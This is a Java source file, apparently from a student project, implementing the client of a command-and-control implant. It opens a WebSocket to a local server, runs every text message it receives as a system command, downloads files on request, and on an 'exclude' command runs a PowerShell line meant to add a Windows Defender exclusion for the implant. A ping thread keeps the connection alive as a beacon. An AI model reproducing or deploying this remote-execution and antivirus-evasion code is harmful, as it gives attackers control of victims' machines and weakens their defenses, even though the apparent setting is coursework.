package org.esisar.command_control;

import org.esisar.command_control.parsing.Parser;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.nio.ByteBuffer;
import java.util.concurrent.*;


public class MonClientMachine {
    public static void main(String[] args) throws InterruptedException {  //thows Exeption peut-être à chener pour un try-catch sur le latch
    	CountDownLatch latch = new CountDownLatch(1);
        HttpClient client = HttpClient.newHttpClient();

        WebSocket webSocket = client.newWebSocketBuilder()
                .buildAsync(URI.create("ws://localhost:7000/"), new WebSocket.Listener() {

                    @Override
                    public CompletionStage<?> onPong(WebSocket webSocket, ByteBuffer message){
                    	System.out.println("Pong reçu");
                    	return WebSocket.Listener.super.onPong(webSocket, message);
                    }
                	
                	@Override
                    public CompletionStage<?> onText(WebSocket webSocket, CharSequence data, boolean last) {
                        String messageRecu = data.toString();
                        System.out.println("Message reçu : " + messageRecu);

                        // Quand on a un message : donc une commande, on l'exécute !
                        if(messageRecu.startsWith("download")){
                            new Thread(() -> {
                                String fichier = messageRecu.split(" ", 2)[1];
                                try {
                                    org.esisar.command_control.download.Download.main(fichier);
                                } catch (Exception e) {
                                    System.err.println("Erreur lors du téléchargement : " + e.getMessage());
                                }
                            }).start();
                        }
                        //exclution wniDef
                        else if(messageRecu.startsWith("exclude")){
                        	try {
                                Parser.executeCommand("Add-MpPreference -ExclutionProcess 'NomDeLExecutable.exe'");
                            } catch (IOException e) {
                                throw new RuntimeException(e);
                            }
                        }
                        
                        //Execute une commande
                        else if(!messageRecu.equals("Pong")) {
                            try {
                                Parser.executeCommand(messageRecu);
                            } catch (IOException e) {
                                throw new RuntimeException(e);
                            }
                        }

                        // Indique au WebSocket qu'on est prêt à recevoir le prochain message
                        webSocket.request(1);
                        return WebSocket.Listener.super.onText(webSocket, data, last);
                    }

                    @Override
                    public void onError(WebSocket webSocket, Throwable error) {
                        System.err.println("Erreur : " + error.getMessage());
                        latch.countDown();
                    }

                    @Override
                    public CompletionStage<?> onClose(WebSocket webSocket, int statusCode, String reason) {
                        System.out.println("Connexion fermée : " + reason);
                        latch.countDown();
                        return null;
                    }
                }).join();

        // Premier message pour initier la conversation
        webSocket.sendText("Connexion établie", true);

        Thread ping = new Thread(() -> {
            while(true) {
                webSocket.sendText("Ping", true);
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }


        });

        // Bloque le programme pour qu'il reste à l'écoute
        ping.setDaemon(true); // Le thread s'arrêtera si le programme principal s'arrête
        ping.start();


        latch.await();
    }
}